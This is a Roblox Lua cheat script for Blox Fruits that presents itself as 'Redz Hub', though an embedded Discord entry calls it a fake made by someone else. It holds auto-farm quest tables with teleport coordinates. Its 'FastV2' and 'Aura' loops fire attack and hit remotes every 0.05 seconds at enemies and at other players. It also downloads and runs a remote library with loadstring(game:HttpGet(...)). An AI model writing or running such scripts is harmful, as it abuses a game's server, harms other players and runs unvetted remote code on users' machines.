                                                                                                                                                            NVCheck = "SubmergedQuest3"
                                                                                                                                                            MobInfo = "Grand Devotee"
                                                                                                                                                            local cframe = CFrame.new(9636.34961, -1992.26013, 9613.07715, -0.596759319, -5.84091993e-08, -0.802420259, -9.79421415e-08, 1, 4.82141341e-11, 0.802420259, 7.86195287e-08, -0.596759319)
                                                                                                                                                            NVCf = cframe
                                                                                                                                                            local cframe2 = CFrame.new(9557.5849609375, -1928.0404052734, 9859.1826171875)
                                                                                                                                                            CfM = cframe2
                                                                                                                                                        end
                                                                                                                                                    else
                                                                                                                                                        Mon = "Isle Champion"
                                                                                                                                                        NVInfo = 2
                                                                                                                                                        NVCheck = "TikiQuest2"
                                                                                                                                                        MobInfo = "Isle Champion"
                                                                                                                                                        local cframe = CFrame.new(-16541.0215, 57.3082275, 1051.46118, 0.0410757065, 0, -0.999156058, 0, 1, 0, 0.999156058, 0, 0.0410757065)
                                                                                                                                                        NVCf = cframe
                                                                                                                                                        local cframe2 = CFrame.new(-16602.1015625, 130.38734436035, 1087.2456054688)
                                                                                                                                                        CfM = cframe2
                                                                                                                                                    end
                                                                                                                                                else
                                                                                                                                                    Mon = "Sun-kissed Warrior"
                                                                                                                                                    NVInfo = 1
                                                                                                                                                    NVCheck = "TikiQuest2"
                                                                                                                                                    MobInfo = "kissed Warrior"
                                                                                                                                                    local cframe = CFrame.new(-16347, 64, 984)
                                                                                                                                                    CfM = cframe
                                                                                                                                                    local cframe2 = CFrame.new(-16538, 55, 1049)
                                                                                                                                                    NVCf = cframe2
                                                                                                                                                end
                                                                                                                                            else
                                                                                                                                                Mon = "Island Boy"
                                                                                                                                                NVInfo = 2
                                                                                                                                                NVCheck = "TikiQuest1"
                                                                                                                                                MobInfo = "Island Boy"
                                                                                                                                                local cframe = CFrame.new(-16548.8164, 55.6059914, -172.8125, 0.213092566, 0, -0.977032006, 0, 1, 0, 0.977032006, 0, 0.213092566)
                                                                                                                                                NVCf = cframe
                                                                                                                                                local cframe2 = CFrame.new(-16849.396484375, 192.86505126953, -150.78532409668)
                                                                                                                                                CfM = cframe2
                                                                                                                                            end
                                                                                                                                        else
                                                                                                                                            Mon = "Isle Outlaw"
                                                                                                                                            NVInfo = 1
                                                                                                                                            NVCheck = "TikiQuest1"
                                                                                                                                            MobInfo = "Isle Outlaw"
                                                                                                                                            local cframe = CFrame.new(-16548.8164, 55.6059914, -172.8125, 0.213092566, 0, -0.977032006, 0, 1, 0, 0.977032006, 0, 0.213092566)
                                                                                                                                            NVCf = cframe
                                                                                                                                            local cframe2 = CFrame.new(-16479.900390625, 226.6117401123, -300.31143188477)
                                                                                                                                            CfM = cframe2
                                                                                                                                        end
                                                                                                                                    else
                                                                                                                                        Mon = "Candy Pirate"
                                                                                                                                        NVInfo = 1
                                                                                                                                        NVCheck = "CandyQuest1"
                                                                                                                                        MobInfo = "Candy Pirate"
                                                                                                                                        local cframe = CFrame.new(-1150.0400390625, 20.378934860229, -14446.334960938)
                                                                                                                                        NVCf = cframe
                                                                                                                                        local cframe2 = CFrame.new(-1310.5003662109, 26.016523361206, -14562.404296875)
                                                                                                                                        CfM = cframe2
                                                                                                                                    end
                                                                                                                                else
                                                                                                                                    Mon = "Candy Rebel"
                                                                                                                                    NVInfo = 2
                                                                                                                                    NVCheck = "ChocQuest2"
                                                                                                                                    MobInfo = "Candy Rebel"
                                                                                                                                    local cframe = CFrame.new(150.50663757324, 30.693693161011, -12774.502929688)
                                                                                                                                    NVCf = cframe
                                                                                                                                    local cframe2 = CFrame.new(134.86563110352, 77.247680664062, -12876.547851562)
                                                                                                                                    CfM = cframe2
                                                                                                                                end
                                                                                                                            else
                                                                                                                                Mon = "Sweet Thief"
                                                                                                                                NVInfo = 1
                                                                                                                                NVCheck = "ChocQuest2"
                                                                                                                                MobInfo = "Sweet Thief"
                                                                                                                                local cframe = CFrame.new(150.50663757324, 30.693693161011, -12774.502929688)
                                                                                                                                NVCf = cframe
                                                                                                                                local cframe2 = CFrame.new(165.1884765625, 76.058853149414, -12600.836914062)
                                                                                                                                CfM = cframe2
                                                                                                                            end
                                                                                                                        else
                                                                                                                            Mon = "Chocolate Bar Battler"
                                                                                                                            NVInfo = 2
                                                                                                                            NVCheck = "ChocQuest1"
                                                                                                                            MobInfo = "Chocolate Bar Battler"
                                                                                                                            local cframe = CFrame.new(233.22836303711, 29.876001358032, -12201.233398438)
                                                                                                                            NVCf = cframe
                                                                                                                            local cframe2 = CFrame.new(582.59057617188, 77.188095092773, -12463.162109375)
                                                                                                                            CfM = cframe2
                                                                                                                        end
                                                                                                                    else
                                                                                                                        Mon = "Cocoa Warrior"
                                                                                                                        NVInfo = 1
                                                                                                                        NVCheck = "ChocQuest1"
                                                                                                                        MobInfo = "Cocoa Warrior"
                                                                                                                        local cframe = CFrame.new(233.22836303711, 29.876001358032, -12201.233398438)
                                                                                                                        NVCf = cframe
                                                                                                                        local cframe2 = CFrame.new(-21.553283691406, 80.574996948242, -12352.387695312)
                                                                                                                        CfM = cframe2
                                                                                                                    end
                                                                                                                else
                                                                                                                    Mon = "Head Baker"
                                                                                                                    NVInfo = 2
                                                                                                                    NVCheck = "CakeQuest2"
                                                                                                                    MobInfo = "Head Baker"
                                                                                                                    local cframe = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                                                                                                                    NVCf = cframe
                                                                                                                    local cframe2 = CFrame.new(-2216.1882324219, 82.884521484375, -12869.293945312)
                                                                                                                    CfM = cframe2
                                                                                                                end
                                                                                                            else
                                                                                                                Mon = "Baking Staff"
                                                                                                                NVInfo = 1
                                                                                                                NVCheck = "CakeQuest2"
                                                                                                                MobInfo = "Baking Staff"
                                                                                                                local cframe = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                                                                                                                NVCf = cframe
                                                                                                                local cframe2 = CFrame.new(-1887.8099365234, 77.618507385254, -12998.350585938)
                                                                                                                CfM = cframe2
                                                                                                            end
                                                                                                        else
                                                                                                            Mon = "Cake Guard"
                                                                                                            NVInfo = 2
                                                                                                            NVCheck = "CakeQuest1"
                                                                                                            MobInfo = "Cake Guard"
                                                                                                            local cframe = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -8.80302053e-08, 0.288177818, 6.9301187e-08, 1, 7.51931211e-08, -0.288177818, -5.2032135e-08, 0.957576931)
                                                                                                            NVCf = cframe
                                                                                                            local cframe2 = CFrame.new(-1598.3070068359, 43.773197174072, -12244.581054688)
                                                                                                            CfM = cframe2
                                                                                                        end
                                                                                                    else
                                                                                                        Mon = "Cookie Crafter"
                                                                                                        NVInfo = 1
                                                                                                        NVCheck = "CakeQuest1"
                                                                                                        MobInfo = "Cookie Crafter"
                                                                                                        local cframe = CFrame.new(-2021.32007, 37.7982254, -12028.7295, 0.957576931, -8.80302053e-08, 0.288177818, 6.9301187e-08, 1, 7.51931211e-08, -0.288177818, -5.2032135e-08, 0.957576931)
                                                                                                        NVCf = cframe
                                                                                                        local cframe2 = CFrame.new(-2374.13671875, 37.798263549805, -12125.30859375)
                                                                                                        CfM = cframe2
                                                                                                    end
                                                                                                else
                                                                                                    Mon = "Ice Cream Commander"
                                                                                                    NVInfo = 2
                                                                                                    NVCheck = "IceCreamIslandQuest"
                                                                                                    MobInfo = "Ice Cream Commander"
                                                                                                    local cframe = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                                                                    NVCf = cframe
                                                                                                    local cframe2 = CFrame.new(-558.06103515625, 112.04895782471, -11290.774414062)
                                                                                                    CfM = cframe2
                                                                                                end
                                                                                            else
                                                                                                Mon = "Ice Cream Chef"
                                                                                                NVInfo = 1
                                                                                                NVCheck = "IceCreamIslandQuest"
                                                                                                MobInfo = "Ice Cream Chef"
                                                                                                local cframe = CFrame.new(-820.64825439453, 65.819526672363, -10965.795898438, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                                                                NVCf = cframe
                                                                                                local cframe2 = CFrame.new(-872.24658203125, 65.81957244873, -10919.95703125)
                                                                                                CfM = cframe2
                                                                                            end
                                                                                        else
                                                                                            Mon = "Peanut President"
                                                                                            NVInfo = 2
                                                                                            NVCheck = "NutsIslandQuest"
                                                                                            MobInfo = "Peanut President"
                                                                                            local cframe = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                                                            NVCf = cframe
                                                                                            local cframe2 = CFrame.new(-1859.3540039062, 38.103168487549, -10422.4296875)
                                                                                            CfM = cframe2
                                                                                        end
                                                                                    else
                                                                                        Mon = "Peanut Scout"
                                                                                        NVInfo = 1
                                                                                        NVCheck = "NutsIslandQuest"
                                                                                        MobInfo = "Peanut Scout"
                                                                                        local cframe = CFrame.new(-2104.3908691406, 38.104167938232, -10194.21875, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                                                        NVCf = cframe
                                                                                        local cframe2 = CFrame.new(-2143.2419433594, 47.721984863281, -10029.995117188)
                                                                                        CfM = cframe2
                                                                                    end
                                                                                else
                                                                                    Mon = "Possessed Mummy"
                                                                                    NVInfo = 2
                                                                                    NVCheck = "HauntedQuest2"
                                                                                    MobInfo = "Possessed Mummy"
                                                                                    local cframe = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                                                    NVCf = cframe
                                                                                    local cframe2 = CFrame.new(-9582.0224609375, 6.2515273094177, 6205.478515625)
                                                                                    CfM = cframe2
                                                                                end
                                                                            else
                                                                                Mon = "Demonic Soul"
                                                                                NVInfo = 1
                                                                                NVCheck = "HauntedQuest2"
                                                                                MobInfo = "Demonic Soul"
                                                                                local cframe = CFrame.new(-9516.99316, 172.017181, 6078.46533, 0, 0, -1, 0, 1, 0, 1, 0, 0)
                                                                                NVCf = cframe
                                                                                local cframe2 = CFrame.new(-9505.8720703125, 172.10482788086, 6158.9931640625)
                                                                                CfM = cframe2
                                                                            end
                                                                        else
                                                                            Mon = "Living Zombie"
                                                                            NVInfo = 2
                                                                            NVCheck = "HauntedQuest1"
                                                                            MobInfo = "Living Zombie"
                                                                            local cframe = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, 0, -1, 0, 0)
                                                                            NVCf = cframe
                                                                            local cframe2 = CFrame.new(-10144.131835938, 138.6266784668, 5838.0888671875)
                                                                            CfM = cframe2
                                                                        end
                                                                    else
                                                                        Mon = "Reborn Skeleton"
                                                                        NVInfo = 1
                                                                        NVCheck = "HauntedQuest1"
                                                                        MobInfo = "Reborn Skeleton"
                                                                        local cframe = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, 0, -1, 0, 0)
                                                                        NVCf = cframe
                                                                        local cframe2 = CFrame.new(-8763.7236328125, 165.72299194336, 6159.8618164062)
                                                                        CfM = cframe2
                                                                    end
                                                                else
                                                                    Mon = "Musketeer Pirate"
                                                                    NVInfo = 2
                                                                    NVCheck = "DeepForestIsland2"
                                                                    MobInfo = "Musketeer Pirate"
                                                                    local cframe = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                                                                    NVCf = cframe
                                                                    local cframe2 = CFrame.new(-13457.904296875, 391.54565429688, -9859.177734375)
                                                                    CfM = cframe2
                                                                end
                                                            else
                                                                Mon = "Jungle Pirate"
                                                                NVInfo = 1
                                                                NVCheck = "DeepForestIsland2"
                                                                MobInfo = "Jungle Pirate"
                                                                local cframe = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                                                                NVCf = cframe
                                                                local cframe2 = CFrame.new(-12256.16015625, 331.73828125, -10485.836914062)
                                                                CfM = cframe2
                                                            end
                                                        else
                                                            Mon = "Mythological Pirate"
                                                            NVInfo = 2
                                                            NVCheck = "DeepForestIsland"
                                                            MobInfo = "Mythological Pirate"
                                                            local cframe = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, 0, -0.707079291, 0, 1, 0, 0.707079291, 0, 0.707134247)
                                                            NVCf = cframe
                                                            local cframe2 = CFrame.new(-13680.607421875, 501.08154296875, -6991.189453125)
                                                            CfM = cframe2
                                                        end
                                                    else
                                                        Mon = "Forest Pirate"
                                                        NVInfo = 1
                                                        NVCheck = "DeepForestIsland"
                                                        MobInfo = "Forest Pirate"
                                                        local cframe = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, 0, -0.707079291, 0, 1, 0, 0.707079291, 0, 0.707134247)
                                                        NVCf = cframe
                                                        local cframe2 = CFrame.new(-13274.478515625, 332.37814331055, -7769.5805664062)
                                                        CfM = cframe2
                                                    end
                                                else
                                                    Mon = "Fishman Captain"
                                                    NVInfo = 2
                                                    NVCheck = "DeepForestIsland3"
                                                    MobInfo = "Fishman Captain"
                                                    local cframe = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                                                    NVCf = cframe
                                                    local cframe2 = CFrame.new(-10994.701171875, 352.38140869141, -9002.1103515625)
                                                    CfM = cframe2
                                                end
                                            else
                                                Mon = "Fishman Raider"
                                                NVInfo = 1
                                                NVCheck = "DeepForestIsland3"
                                                MobInfo = "Fishman Raider"
                                                local cframe = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                                                NVCf = cframe
                                                local cframe2 = CFrame.new(-10407.526367188, 331.76263427734, -8368.5166015625)
                                                CfM = cframe2
                                            end
                                        else
                                            Mon = "Marine Rear Admiral"
                                            MobInfo = "Marine Rear Admiral"
                                            NVCheck = "MarineTreeIsland"
                                            NVInfo = 2
                                            local cframe = CFrame.new(2179.98828125, 28.731239318848, -6740.0551757813)
                                            NVCf = cframe
                                            local cframe2 = CFrame.new(3656.7736816406, 160.52406311035, -7001.5986328125)
                                            CfM = cframe2
                                        end
                                    else
                                        Mon = "Marine Commodore"
                                        NVInfo = 1
                                        NVCheck = "MarineTreeIsland"
                                        MobInfo = "Marine Commodore"
                                        local cframe = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                                        NVCf = cframe
                                        local cframe2 = CFrame.new(2286.0078125, 73.133918762207, -7159.8090820312)
                                        CfM = cframe2
                                    end
                                else
                                    Mon = "Venomous Assailant"
                                    NVCheck = "VenomCrewQuest"
                                    NVInfo = 2
                                    MobInfo = "Venomous Assailant"
                                    local cframe = CFrame.new(4697.5918, 1100.65137, 946.401978, 0.579397917, -4.19689783e-10, 0.81504482, -1.49287818e-10, 1, 6.21053986e-10, -0.81504482, -4.81513662e-10, 0.579397917)
                                    NVCf = cframe
                                    local cframe2 = CFrame.new(4697.5918, 1100.65137, 946.401978, 0.579397917, -4.19689783e-10, 0.81504482, -1.49287818e-10, 1, 6.21053986e-10, -0.81504482, -4.81513662e-10, 0.579397917)
                                    CfM = cframe2
                                end
                            else
                                Mon = "Hydra Enforcer"
                                NVCheck = "VenomCrewQuest"
                                NVInfo = 1
                                MobInfo = "Hydra Enforcer"
                                local cframe = CFrame.new(4620.6157226562, 1002.2954711914, 399.08688354492)
                                NVCf = cframe
                                local cframe2 = CFrame.new(4620.6157226562, 1002.2954711914, 399.08688354492)
                                CfM = cframe2
                            end
                        else
                            Mon = "Dragon Crew Archer"
                            NVCheck = "DragonCrewQuest"
                            NVInfo = 2
                            MobInfo = "Dragon Crew Archer"
                            local cframe = CFrame.new(6955.8974609375, 546.66589355469, 309.04013061523)
                            NVCf = cframe
                            local cframe2 = CFrame.new(6955.8974609375, 546.66589355469, 309.04013061523)
                            CfM = cframe2
                        end
                    else
                        Mon = "Dragon Crew Warrior"
                        NVInfo = 1
                        NVCheck = "DragonCrewQuest"
                        MobInfo = "Dragon Crew Warrior"
                        local cframe = CFrame.new(6779.0327148438, 111.16865539551, -801.21307373047)
                        NVCf = cframe
                        local cframe2 = CFrame.new(6779.0327148438, 111.16865539551, -801.21307373047)
                        CfM = cframe2
                    end
                else
                    Mon = "Pistol Billionaire"
                    NVInfo = 2
                    NVCheck = "PiratePortQuest"
                    MobInfo = "Pistol Billionaire"
                    local cframe = CFrame.new(-723.43316650391, 147.42906188965, 5931.9931640625)
                    NVCf = cframe
                    local cframe2 = CFrame.new(-723.43316650391, 147.42906188965, 5931.9931640625)
                    CfM = cframe2
                end
            else
                Mon = "Pirate Millionaire"
                NVInfo = 1
                NVCheck = "PiratePortQuest"
                MobInfo = "Pirate Millionaire"
                local cframe = CFrame.new(-712.82727050781, 98.577049255371, 5711.9541015625)
                NVCf = cframe
                local cframe2 = CFrame.new(-712.82727050781, 98.577049255371, 5711.9541015625)
                CfM = cframe2
            end
        end
    end

    MaterialMon = function()
        local character3 = localPlayer.Character
        local humanoidRootPart2 = character3 and localPlayer.Character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return
        end

        shouldRequestEntrance = function(arg, arg2)
            if arg2 <= (humanoidRootPart2.Position - arg).Magnitude then
                ReplicatedStorage2.Remotes.CommF_:InvokeServer("requestEntrance", arg)
            end
        end

        MMon = nil
        MPos = nil
        SP = "Default"

        if World1 then
            if SelectMaterial == "Angel Wings" then
                MMon = {
                    "Shanda",
                    "Royal Squad",
                    "Royal Soldier",
                    "Wysper",
                    "Thunder God",
                }

                local cframe = CFrame.new(-4698, 845, -1912)
                MPos = cframe
                shouldRequestEntrance(Vector3.new(-4607.82275, 872.54248, -1667.55688), 10000)
            elseif SelectMaterial == "Leather + Scrap Metal" then
                MMon = {"Brute", "Pirate"}
                local cframe = CFrame.new(-1145, 15, 4350)
                MPos = cframe
            elseif SelectMaterial == "Magma Ore" then
                MMon = {"Military Soldier", "Military Spy", "Magma Admiral"}
                local cframe = CFrame.new(-5815, 84, 8820)
                MPos = cframe
            elseif SelectMaterial == "Fish Tail" then
                MMon = {"Fishman Warrior", "Fishman Commando", "Fishman Lord"}
                local cframe = CFrame.new(61123, 19, 1569)
                MPos = cframe
                shouldRequestEntrance(Vector3.new(61163.8515625, 5.342342376708984, 1819.7841796875), 17000)
            end
        elseif World2 then
            if SelectMaterial == "Leather + Scrap Metal" then
                MMon = {"Marine Captain"}
                local cframe = CFrame.new(-2010.5059814453125, 73.00115966796875, -3326.620849609375)
                MPos = cframe
            elseif SelectMaterial == "Magma Ore" then
                MMon = {"Magma Ninja", "Lava Pirate"}
                local cframe = CFrame.new(-5428, 78, -5959)
                MPos = cframe
            elseif SelectMaterial == "Ectoplasm" then
                MMon = {
                    "Ship Deckhand",
                    "Ship Engineer",
                    "Ship Steward",
                    "Ship Officer",
                }

                local cframe = CFrame.new(911.35827636719, 125.95812988281, 33159.5390625)
                MPos = cframe
                shouldRequestEntrance(Vector3.new(61163.8515625, 5.342342376708984, 1819.7841796875), 18000)
            elseif SelectMaterial == "Mystic Droplet" then
                MMon = {"Sea Soldier", "Water Fighter"}
                local cframe = CFrame.new(-3385, 239, -10542)
                MPos = cframe
            elseif SelectMaterial == "Radioactive Material" then
                MMon = {"Factory Staff"}
                local cframe = CFrame.new(295, 73, -56)
                MPos = cframe
            elseif SelectMaterial == "Vampire Fang" then
                MMon = {"Vampire"}
                local cframe = CFrame.new(-6033, 7, -1317)
                MPos = cframe
            end
        elseif World3 then
            if SelectMaterial == "Scrap Metal" then
                MMon = {"Jungle Pirate", "Forest Pirate"}
                local cframe = CFrame.new(-11975.78515625, 331.7734069824219, -10620.0302734375)
                MPos = cframe
            elseif SelectMaterial == "Fish Tail" then
                MMon = {"Fishman Raider", "Fishman Captain"}
                local cframe = CFrame.new(-10993, 332, -8940)
                MPos = cframe
            elseif SelectMaterial == "Conjured Cocoa" then
                MMon = {"Chocolate Bar Battler", "Cocoa Warrior"}
                local cframe = CFrame.new(620.6344604492188, 78.93644714355469, -12581.369140625)
                MPos = cframe
            elseif SelectMaterial == "Dragon Scale" then
                MMon = {"Dragon Crew Archer", "Dragon Crew Warrior"}
                local cframe = CFrame.new(6594, 383, 139)
                MPos = cframe
            elseif SelectMaterial == "Gunpowder" then
                MMon = {"Pistol Billionaire"}
                local cframe = CFrame.new(-84.8556900024414, 85.62061309814453, 6132.0087890625)
                MPos = cframe
            elseif SelectMaterial == "Mini Tusk" then
                MMon = {"Mythological Pirate"}
                local cframe = CFrame.new(-13545, 470, -6917)
                MPos = cframe
            elseif SelectMaterial == "Demonic Wisp" then
                MMon = {"Demonic Soul"}
                local cframe = CFrame.new(-9495.6806640625, 453.58624267578125, 5977.3486328125)
                MPos = cframe
            end
        end
    end

    QuestNeta = function()
        QuestCheck()
        return {Mon, NVInfo, NVCheck, CfM, MobInfo, NVCf}
    end

    local ReplicatedStorage4 = game:GetService("ReplicatedStorage")
    local Players3 = game:GetService("Players")
    local RunService4 = game:GetService("RunService")
    local localPlayer6 = Players3.LocalPlayer
    local RegisterHit = require(ReplicatedStorage4.Modules.Net):RemoteEvent("RegisterHit", true)
    local reRegisterAttack = ReplicatedStorage4.Modules.Net["RE/RegisterAttack"]
    local n = 0

    local function fn24(arg, arg2)
        local tbl11 = {}

        for i, child in ipairs(workspace.Enemies:GetChildren()) do
            local humanoidRootPart2 = child:FindFirstChild("HumanoidRootPart")
            local humanoid = child:FindFirstChild("Humanoid")

            if humanoidRootPart2 and humanoid and humanoid.Health > 0 and (humanoidRootPart2.Position - arg.Position).Magnitude <= arg2 then
                tbl11[#tbl11 + 1] = {child, humanoidRootPart2}
            end
        end

        for i, player in ipairs(Players3:GetPlayers()) do
            if player ~= localPlayer6 and player.Character then
                local humanoidRootPart2 = player.Character:FindFirstChild("HumanoidRootPart")
                local humanoid = player.Character:FindFirstChild("Humanoid")

                if humanoidRootPart2 and humanoid and humanoid.Health > 0 and (humanoidRootPart2.Position - arg.Position).Magnitude <= arg2 then
                    tbl11[#tbl11 + 1] = {player.Character, humanoidRootPart2}
                end
            end
        end

        return tbl11
    end

    RunService4.Heartbeat:Connect(function()
        if not _G.FastV2 then
            return
        end
        local character3 = localPlayer6.Character
        if not character3 then
            return
        end
        local humanoid = character3:FindFirstChild("Humanoid")
        local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
        if not humanoid or humanoid.Health <= 0 or not humanoidRootPart2 then
            return
        end
        local now = os.clock()
        if now - n < 0.05 then
            return
        end
        local v17 = fn24(humanoidRootPart2, 80)

        if #v17 > 0 then
            n = now
            reRegisterAttack:FireServer()
            RegisterHit:FireServer(humanoidRootPart2, v17, nil, nil, tostring(now))
        end
    end)

    local enemies = workspace:FindFirstChild("Enemies")
    local characters = workspace:FindFirstChild("Characters")
    if not enemies or not characters then
        return
    end
    local v17 = nil
    local n2 = 0

    getTool = function()
        local character3 = localPlayer6.Character

        if character3 then
            for k, child in pairs(character3:GetChildren()) do
                if child:IsA("Tool") and child:FindFirstChild("LeftClickRemote") then
                    return child
                end
            end
        end

        for k, child in pairs(localPlayer6.Backpack:GetChildren()) do
            if child:IsA("Tool") and child:FindFirstChild("LeftClickRemote") then
                return child
            end
        end
    end

    RunService4.Heartbeat:Connect(function()
        if not _G.Aura then
            return
        end
        local character3 = localPlayer6.Character
        if not character3 then
            return
        end
        local humanoidRootPart2 = character3:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart2 then
            return
        end

        if not v17 or not v17.Parent then
            v17 = getTool()
        end

        if not v17 then
            return
        end
        local leftClickRemote = v17.LeftClickRemote
        local position = humanoidRootPart2.Position
        local now = tick()
        if now - n2 < 0.05 then
            return
        end
        n2 = now

        for k, child in pairs(enemies:GetChildren()) do
            local humanoidRootPart3 = child:FindFirstChild("HumanoidRootPart")

            if humanoidRootPart3 and child:FindFirstChild("Humanoid") then
                leftClickRemote:FireServer((humanoidRootPart3.Position - position).Unit, 1)
            end
        end

        for k, child in pairs(characters:GetChildren()) do
            if child ~= character3 then
                local humanoidRootPart3 = child:FindFirstChild("HumanoidRootPart")

                if humanoidRootPart3 and child:FindFirstChild("Humanoid") then
                    leftClickRemote:FireServer((humanoidRootPart3.Position - position).Unit, 1)
                end
            end
        end
    end)

    local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/LongHip12/LonelyLib/refs/heads/main/RedzLib-1.lua%20(1).txt"))()

    local v18 = lib:MakeWindow({
        Title = "Redz Hub : Blox Fruit",
        SubTitle = "by realredz9999",
        SaveFolder = "Redz.lua",
    })

    if _G.AutoTranslate then
        local tbl11 = {
            "Name",
            "Title",
            "Text",
            "Description",
            "Desc",
            "Content",
            "Placeholder",
            "PlaceholderText",
        }

        local makeTab = v18.MakeTab

        v18.MakeTab = function(arg, arg2, ...)
            local v19 = arg2

            if type(arg2) == "table" and type(arg2[1]) == "string" then
                arg2[1] = Translate(arg2[1])
            end

            if type(arg2) == "string" then
                v19 = Translate(arg2)
            end

            local v20 = makeTab(arg, v19, ...)

            for i, v21 in ipairs({
                "AddToggle",
                "AddButton",
                "AddSlider",
                "AddDropdown",
                "AddInput",
                "AddLabel",
                "AddParagraph",
                "AddTextBox",
                "AddColorPicker",
                "AddMultiDropdown",
                "AddSection",
            }) do
                local v22 = v20[v21]

                if v22 then
                    v20[v21] = function(arg3, arg4, ...)
                        local v23 = arg4

                        if type(arg4) == "table" then
                            for i2, v24 in ipairs(tbl11) do
                                if type(arg4[v24]) == "string" then
                                    arg4[v24] = Translate(arg4[v24])
                                end
                            end
                        end

                        if type(arg4) == "string" then
                            v23 = Translate(arg4)
                        end

                        return v22(arg3, v23, ...)
                    end
                end
            end

            return v20
        end
    end

    v18:AddMinimizeButton({
        Button = {
            Image = "rbxassetid://15298567397",
            BackgroundTransparency = 0,
        },
        Corner = {CornerRadius = UDim.new(0, 6)},
    })

    local v19 = v18:MakeTab({"Discord", "Info"})
    local v20 = v18:MakeTab({"Farm", "Home"})
    v = nil
    v2 = nil
    v3 = nil

    if World3 then
        v = v18:MakeTab({"Sea", "Waves"})
        v2 = v18:MakeTab({"Race-V4", "rbxassetid://115164375298022"})
        v3 = v18:MakeTab({"Islands", "PalmTree"})
    end

    v4 = v18:MakeTab({"Quests/Items", "Swords"})
    local v21 = v18:MakeTab({"Fishing", "Fish"})
    v5 = v18:MakeTab({"Fruit/Raid", "Cherry"})
    local v22 = v18:MakeTab({"Stats", "Signal"})
    v6 = v18:MakeTab({"Teleport", "Locate"})
    local v23 = v18:MakeTab({"Status", "scroll"})
    v7 = v18:MakeTab({"Visual", "User"})
    v8 = v18:MakeTab({"Shop", "ShoppingCart"})
    v9 = v18:MakeTab({"Misc", "Settings"})

    v19:AddDiscordInvite({
        Title = "redz Hub | Community",
        Description = "A community for redz Hub Users -- official scripts, updates, and suport in one place.",
        Banner = "rbxassetid://17382040552",
        Logo = "rbxassetid://17382040552",
        Invite = "https://discord.gg/redz-hub",
        Members = 470000,
        Online = 20000,
    })

    v19:AddDiscordInvite({
        Title = "Discord OK Hub",
        Description = "discord of owner-Kuri make this redz fake script",
        Banner = "rbxassetid://127632820302449",
        Logo = "rbxassetid://127632820302449",
        Invite = "https://discord.gg/Qf7Wz7ks4D",
        Members = 367,
        Online = -36,
    })

    v23:AddSection("Soon-on updates")

    if World3 then
        local localPlayer7 = game:GetService("Players").LocalPlayer
        local map = workspace:WaitForChild("Map")
        workspace:WaitForChild("_WorldOrigin"):WaitForChild("Locations")
        local v24 = v3:AddParagraph("Mirage Island", "not Spawn")

        task.spawn(function()
            while task.wait(0.2) do
                pcall(function()
                    local mysticIsland = map:FindFirstChild("MysticIsland")

                    if mysticIsland and localPlayer7.Character and localPlayer7.Character:FindFirstChild("HumanoidRootPart") then
                        local n3 = math.floor(localPlayer7:DistanceFromCharacter(mysticIsland:GetPivot().Position) / 5)
                        v24:Set("Mirage Island : Spawned | Distance : " .. n3)
                    else
                        v24:Set("Mirage Island : not Spawn")
                    end
                end)
            end
        end)

        local v25 = v3:AddParagraph("Kitsune Island", "not Spawn")

        task.spawn(function()
            while task.wait(0.2) do
                pcall(function()
                    local kitsuneIsland = map:FindFirstChild("KitsuneIsland")

                    if kitsuneIsland and localPlayer7.Character and localPlayer7.Character:FindFirstChild("HumanoidRootPart") then
                        local n3 = math.floor(localPlayer7:DistanceFromCharacter(kitsuneIsland:GetPivot().Position) / 5)
                        v25:Set("Kitsune Island : Spawned | Distance : " .. n3)
                    else
                        v25:Set("Kitsune Island : not Spawn")
                    end
                end)
            end
        end)

        local v26 = v3:AddParagraph("Prehistoric Island", "not Spawn")

        task.spawn(function()
            while task.wait(0.2) do
                pcall(function()
                    local prehistoricIsland = map:FindFirstChild("PrehistoricIsland")

                    if prehistoricIsland and localPlayer7.Character and localPlayer7.Character:FindFirstChild("HumanoidRootPart") then
                        local n3 = math.floor(localPlayer7:DistanceFromCharacter(prehistoricIsland:GetPivot().Position) / 5)
                        v26:Set("Prehistoric Island : Spawned | Distance : " .. n3)
                    else
                        v26:Set("Prehistoric Island : not Spawn")
                    end
                end)
            end
        end)
    end

    v21:AddSection("Fishing Config")
    local localPlayer7 = game:GetService("Players").LocalPlayer
    local Workspace = game:GetService("Workspace")
    local ReplicatedStorage5 = game:GetService("ReplicatedStorage")
    local net = ReplicatedStorage5:WaitForChild("Modules"):WaitForChild("Net")
    local fishReplicated = ReplicatedStorage5:WaitForChild("FishReplicated")
